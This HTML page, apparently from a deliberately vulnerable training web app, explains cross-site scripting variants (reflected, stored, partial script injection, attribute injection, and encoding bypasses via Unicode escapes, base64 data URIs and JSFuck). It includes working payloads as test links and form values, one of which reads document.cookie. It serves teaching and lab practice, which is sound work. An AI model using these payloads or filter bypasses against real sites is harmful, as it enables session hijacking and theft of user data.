
		<h2 id="2">2. XSS attack</h2>
		<br>
		<p>
		To develop more user interactive web applications, complex user-created
HTML content is rapidly becoming popular. User-created HTML content
is a dangerous vector for XSS[10] attacks, which target websites and confi-
dential user data. XSS attacks have the potential to spread on its own, once
injected and can affect a large population over social networks. XSS exploits
flaws in web applications which allow an attacker to execute arbitrary code
without sanitization.
		</p>
		<br> 
		
			<h3 id="2_a">2.a. XSS Reflected</h3>
				<br>
				<p>
				If a web application reflects back any input data entered by user without performing any sanitization, then a script can also be inserted to perform XSS attack, such attack is known as Reflected XSS.	
				<br><br>
				<u>Attack Scenario</u>: There is a vulnerable website for product search. Which shows all the available results for the searched product (the product name printed as it is without any sanitization).				
				
				</p>
				<br>			
				<a class="btn btn-primary" href=".?page=demos/xss_reflected/xssReflected.php&inp1=<script> alert('Sending your information to attacker !!!'); </script>" target="_blank">Test Link</a>
				<br><br>
				
			<h3 id="2_b">2.b. XSS Stored</h3>
				<br>
				<p>
				In this type of XSS, the entered script is stored in the database rather than reflecting it back. Which will execute on other pages later when displayed as it is without any sanitization.<br><br>
				<u>Attack Scenario</u>: Assume a social network website, which stores all the  posts (entered by users) without sanitization and displays them to all the users. Then an attacker can exploit this vulnerability by posting a script, which will execute whenever a user reads these posts. 
				
				<br><br>
				Assume you are an attacker. Open the <b>XSS Stored</b> demonstration page at low security level and then enter  following attack vector in the input box.
				<br>
				<b><i>&lt;script&gt; alert(&quot;Sending your information  to attacker !&quot;); &lt;/script&gt;</i></b> 
				<br><br>
				Now Log in using different account (as a victim) and visit the 'XSS Stored' demonstration page. 				
				</p>				
				<br><br>
		
			<h3 id="2_c">2.c. Partial Script Injection</h3> 
				<br>
				<p>
				Partial script injection is a variation of XSS attack, which is used to bypass the defense mechanisms developed for protecting against simple XSS attacks. Here attack payload exploits the vulnerability present in the native code of the web application such that the payload is not an active script on its own but when web application uses this payload without any sanitization then it becomes a malicious script (using some part of the native code of the web application).
				<br><br>
				<u>Attack Scenario</u> Assume a website, where when a user enters his name or message, it reflects it back with the help of JavaScript (e.g. document.write()) after using keyword (e.g. script) elimination based sanitization. But partial script injection can bypass such defence easily.				
				<br><br>			
				<a class="btn btn-primary" href='.?page=demos/partial_script_injection/partialScriptInj.php&inp1="); alert("Sending your information to attacker !!!"); document.write("' target="_blank">Test Link</a>							
				</p>
				<br><br>
			
			<h3 id="2_d">2.d. Attribute Injection</h3>
				<br>
				<p>
				Attribute injection is a variation of XSS attack, in which attacker tries to insert an event-attribute for a valid HTML object.
				<br><br>
				<u>Attack Scenario</u>: Assume a website which resizes the profile image of a user based on the height entered by the user, and this website doesn't sanitize or validate the height entered by user.				
				<br><br>			
				<a class="btn btn-primary" href='.?page=demos/attribute_injection/attributeInj.php&inp1=100" onmouseover="alert(document.cookie);' target="_blank">Test Link</a>
				</p>
				<br><br>			
			
			
			<h3 id="2_e">2.e. Encoding based XSS attack</h3> 
				<br>
				<p>
				Keyword blacklisting based XSS prevention solution can be bypassed by encoding them which will be decoded by JavaScript engine while executing. 
				</p>
				<br>
			
				<h4 id="2_e_1">2.e.1. UTF-8 Encoding</h4>
					<br>
					<p>
					<b>alert('Sending your information to attacker !!!')</b> can be written as <b>\u0061\u006C\u0065\u0072\u0074(' \u0053\u0065\u006E \u0064\u0069 \u006E\u0067 \u0020\u0079 \u006F\u0075 \u0072\u0020\u0069\u006E \u0066 \u006F\u0072\u006D\u0061\u0074 \u0069\u006F\u006E \u0020\u0074\u006F \u0020\u0061\u0074 \u0074\u0061\u0063\u006B\u0065 \u0072\u0020\u0021\u0021\u0021')</b>
					
				
					<br><br>
					<a class="btn btn-primary" href=".?page=demos/xss_utf8_encoding/utf8Encoding_submit.php&inp1=\u0061\u006C\u0065\u0072\u0074('\u0053\u0065\u006E\u0064\u0069\u006E\u0067\u0020\u0079\u006F\u0075\u0072\u0020\u0069\u006E\u0066\u006F\u0072\u006D\u0061\u0074\u0069\u006F\u006E\u0020\u0074\u006F\u0020\u0061\u0074\u0074\u0061\u0063\u006B\u0065\u0072\u0020\u0021\u0021\u0021')" target="_blank">Test Link</a>									

					</p>
					<br><br>
							
				
				<h4 id="2_e_2">2.e.2. Base-64 Encoding</h4>
					<br>
					<p>
				
					<b>&lt;script&gt;alert("XSS");&lt;/script&gt;</b> encoded as <b>PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+</b>
					<br><br>					
					<form action=".?page=demos/xss_base64_encoding/base64Encoding.php" method="POST" target="_blank">
					<input type="hidden" name="seclevel" value="1" />	
					<input type="hidden" name="inp1" value='<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+"></object>' />
					<input type="submit" class="btn btn-primary" value="Test Link" />
					</form>

					</p>
					<br><br>				
				
				
				<h4 id="2_e_3">2.e.3. JS Encoding</h4>
					<br>
					<p>
					<b>alert(1)</b> can  be encoded as following
					<br><br>
		<b><i>   
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[
]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+
[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[]
)[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+
(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+
!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!
+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+
[]+!+[]+[+[]]])()		
		</i></b><br>
					<i>Ref</i>: <a href="http://goo.gl/UEVZS" target="_blank">http://goo.gl/UEVZS</a>
		
					<br> 
					<br><br>					
					<form action=".?page=demos/xss_js_encoding/jsEncoding.php" method="POST" target="_blank">
					<input type="hidden" name="seclevel" value="1" />	
					<input type="hidden" name="inp1" value='[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[
]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+
[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[]
)[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+
(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+
!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!
+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+
[]+!+[]+[+[]]])()' />
					<input type="submit" class="btn btn-primary" value="Test Link" />
					</form>
					


					</p>
					<br><br>				
			
		<br><br>
